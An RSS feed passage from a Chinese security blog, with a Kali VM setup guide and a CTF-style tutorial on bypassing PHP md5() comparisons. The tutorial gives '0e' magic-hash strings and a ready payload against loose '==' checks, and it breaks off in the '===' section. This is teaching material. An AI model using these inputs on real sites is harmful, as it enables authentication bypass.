<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><follow_challenge><feedId>77250260013802496</feedId><userId>42117541714060288</userId></follow_challenge><title>网络安全 on Wlynxg's Blog</title><link>https://wlynxg.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link><description>Recent content in 网络安全 on Wlynxg's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 22 Aug 2025 17:34:52 +0800</lastBuildDate><atom:link href="https://wlynxg.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>Kali配置（虚拟机）</title><link>https://wlynxg.github.io/blog/p/kali%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/kali%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA/</guid><description>&lt;h1 id="kali-配置虚拟机">Kali 配置（虚拟机）
&lt;/h1>&lt;h1 id="一安装vmware-tools">一、安装VMWare Tools
&lt;/h1>&lt;p>为了能够实现主机和虚拟机之间的&lt;strong>直接复制粘贴&lt;/strong>和&lt;strong>文件传输&lt;/strong>，我们需要&lt;strong>安装VMWare Tools&lt;/strong>来帮助我们解决这个问题。&lt;/p>
&lt;ol>
&lt;li>&lt;strong>找到VMWare Tools&lt;/strong>：
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-170943.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;li>&lt;strong>找到VMWare Tools安装文件：&lt;/strong>
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-170954.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;li>&lt;strong>文件拷贝：&lt;/strong>
将文件放到主目录下，
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-171022.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;li>&lt;strong>安装：&lt;/strong>
依次输入下面命令安装VMWare Tools，&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tar zxf VMwareTools-10.0.5-3228253.tar.gz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> vmware-tools-distrib/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo ./vmware-install.pl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>输入命令后一直敲&lt;strong>Enter&lt;/strong>键即可。
5. &lt;strong>安装完成：&lt;/strong>
当出现下图语句时即完成VMWare Tools的安装。
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-171036.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h1 id="二修改分辨率">二、修改分辨率
&lt;/h1>&lt;h3 id="当前修改">当前修改
&lt;/h3>&lt;p>终端输入下列命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">xrandr --newmode &lt;span class="s2">&amp;#34;1920x1080&amp;#34;&lt;/span> 173.00 &lt;span class="m">1920&lt;/span> &lt;span class="m">2048&lt;/span> &lt;span class="m">2248&lt;/span> &lt;span class="m">2576&lt;/span> &lt;span class="m">1080&lt;/span> &lt;span class="m">1083&lt;/span> &lt;span class="m">1088&lt;/span> &lt;span class="m">1120&lt;/span> -hsync +vsync
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">xrandr --addmode Virtual1 1920x1080
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">xrandr --output Virtual1 --mode 1920x1080
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="永久修改推荐">永久修改（推荐）
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>查看分辨率：&lt;/strong>
终端输入：&lt;strong>1920x1080_60.00&lt;/strong>对应的是所需修改的分辨率的信息，后续会用到。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">~$ cvt &lt;span class="m">1920&lt;/span> &lt;span class="m">1080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Modeline &lt;span class="s2">&amp;#34;1920x1080_60.00&amp;#34;&lt;/span> 173.00 &lt;span class="m">1920&lt;/span> &lt;span class="m">2048&lt;/span> &lt;span class="m">2248&lt;/span> &lt;span class="m">2576&lt;/span> &lt;span class="m">1080&lt;/span> &lt;span class="m">1083&lt;/span> &lt;span class="m">1088&lt;/span> &lt;span class="m">1120&lt;/span> -hsync +vsync
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>&lt;strong>查看显示器名称：&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl"> ~$ xrandr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Screen 0: minimum &lt;span class="m">1&lt;/span> x 1, current &lt;span class="m">1920&lt;/span> x 1080, maximum &lt;span class="m">8192&lt;/span> x &lt;span class="m">8192&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Virtual1 connected primary 1920x1080+0+0 &lt;span class="o">(&lt;/span>normal left inverted right x axis y axis&lt;span class="o">)&lt;/span> 0mm x 0mm
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 800x600 60.00 + 60.32
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2560x1600 59.99
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1920x1440 60.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1856x1392 60.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1792x1344 60.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1920x1200 59.88
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1600x1200 60.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1680x1050 59.95
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1400x1050 59.98
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1280x1024 60.02
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1440x900 59.89
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1280x960 60.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1360x768 60.02
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1280x800 59.81
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1152x864 75.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1280x768 59.87
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1024x768 60.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 640x480 59.94
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1920x1080_60.00 59.96*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Virtual2 disconnected &lt;span class="o">(&lt;/span>normal left inverted right x axis y axis&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Virtual3 disconnected &lt;span class="o">(&lt;/span>normal left inverted right x axis y axis&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Virtual4 disconnected &lt;span class="o">(&lt;/span>normal left inverted right x axis y axis&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Virtual5 disconnected &lt;span class="o">(&lt;/span>normal left inverted right x axis y axis&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Virtual6 disconnected &lt;span class="o">(&lt;/span>normal left inverted right x axis y axis&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Virtual7 disconnected &lt;span class="o">(&lt;/span>normal left inverted right x axis y axis&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Virtual8 disconnected &lt;span class="o">(&lt;/span>normal left inverted right x axis y axis&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>Virtual1&lt;/strong>即为显示器名称，后续也会用到。
3. &lt;strong>修改分辨率：&lt;/strong>
以管理员身份进入&lt;strong>profile&lt;/strong>文件，&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">~$ sudo vim /etc/profile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>按&lt;strong>i&lt;/strong>进入insert模式修改文件，在文件末尾追加&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl"> xrandr --newmode &lt;span class="s2">&amp;#34;1920x1080_60.00&amp;#34;&lt;/span> 173.00 &lt;span class="m">1920&lt;/span> &lt;span class="m">2048&lt;/span> &lt;span class="m">2248&lt;/span> &lt;span class="m">2576&lt;/span> &lt;span class="m">1080&lt;/span> &lt;span class="m">1083&lt;/span> &lt;span class="m">1088&lt;/span> &lt;span class="m">1120&lt;/span> -hsync +vsync
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xrandr --addmode Virtual1 &lt;span class="s2">&amp;#34;1920x1080_60.00&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>注意：&amp;ldquo;1920x1080_60.00&amp;quot;和Virtual1&lt;/strong>是在查看得到的数据。
按ESC退出insert模式，输入**:wq**保存，并退出。
4. &lt;strong>重载配置文件：&lt;/strong>
终端输入下列命令重载配置文件。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">~$ &lt;span class="nb">source&lt;/span> /etc/profile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="5">
&lt;li>&lt;strong>修改分辨率：&lt;/strong>
通过 settings-&amp;gt;displays-&amp;gt;resolution中找到刚才添加的分辨率了，修改分辨率后即可永久修改。
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-171055.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-171103.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h1 id="三修改图标和字体大小">三、修改图标和字体大小
&lt;/h1>&lt;ol>
&lt;li>“设置” &amp;ndash;&amp;gt; &amp;ldquo;通用辅助功能&amp;rdquo; &amp;ndash;&amp;gt; &amp;ldquo;大号字体&amp;rdquo;&lt;/li>
&lt;li>在终端中输入 “gnome-tweaks” 打开 优化 &amp;ndash;&amp;gt; 扩展 &amp;ndash;&amp;gt; dash to dock &amp;ndash;&amp;gt; 点击齿轮按钮，可以设置图标大小，&lt;/li>
&lt;li>gnome-tweaks 中可设置字体大小&lt;/li>
&lt;/ol>
&lt;h1 id="四更新换源">四、更新换源
&lt;/h1>&lt;p>因为kali是国外的，所以一些软件你要下载的话得从国外的网站下载，就会很慢。国内一些公司或者学校提供了国内的下载地址，通过国内下载的话速度将会大大提高，所以我们需要更换更新源。&lt;/p>
&lt;ol>
&lt;li>&lt;strong>终端输入：&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl"> leafpad /etc/apt/sources.list
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>&lt;strong>换源：&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#阿里云&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#清华大学&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#浙江大学&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="3">
&lt;li>&lt;strong>重载：&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">apt-get clean &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> apt-get update &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> apt-get upgrade -y &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> apt-get dist-upgrade -y
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令讲解：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">apt-get clean //清除缓存索引
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get update //更新索引文件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get upgrade //更新实际的软件包文件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get dist-upgrade //根据依赖关系更新
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>php MD5值比较绕过</title><link>https://wlynxg.github.io/blog/p/php-md5%E5%80%BC%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/php-md5%E5%80%BC%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87/</guid><description>&lt;h1 id="php-md5值比较绕过">php MD5值比较绕过
&lt;/h1>&lt;h2 id="关于-md5-函数">关于 md5() 函数
&lt;/h2>&lt;blockquote>
&lt;p>在 php 程序中，md5($string,bool): 得到一个字符串散列值。其中第二个参数默认为false,表示该函数返回值是32个字符的十六进制数。若指定为true,则表示函数返回的是16字节的二进制格式（这样通过浏览器解析会出现乱码）。&lt;/p>
&lt;/blockquote>
&lt;h2 id="-绕过">== 绕过
&lt;/h2>&lt;p>&lt;strong>示例：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nv">$flag&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>绕过原理：&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，结果均为0，因此在比较两个以 &lt;code>0e&lt;/code> 开头的字符串时，无论后面的字符时是什么，比较结果都为 True。&lt;/p>
&lt;/blockquote>
&lt;p>常用 MD5 值以 &lt;code>0e&lt;/code> 开头的字符串：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>字符串&lt;/th>
&lt;th>MD5 值&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>QNKCDZO&lt;/td>
&lt;td>0e830400451993494058024219903391&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>s878926199a&lt;/td>
&lt;td>0e545993274517709034328855841020&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>s155964671a&lt;/td>
&lt;td>0e342768416822451524974117254469&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>s214587387a&lt;/td>
&lt;td>0e848240448830537924465865611904&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>s214587387a&lt;/td>
&lt;td>0e848240448830537924465865611904&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>s878926199a&lt;/td>
&lt;td>0e545993274517709034328855841020&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>s1091221200a&lt;/td>
&lt;td>0e940624217856561557816327384675&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;strong>payload：&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>a=QNKCDZO&amp;amp;b=s878926199a
&lt;/code>&lt;/pre>&lt;h2 id="-绕过-1">=== 绕过
&lt;/h2>&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">]){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">])){&lt;/span>
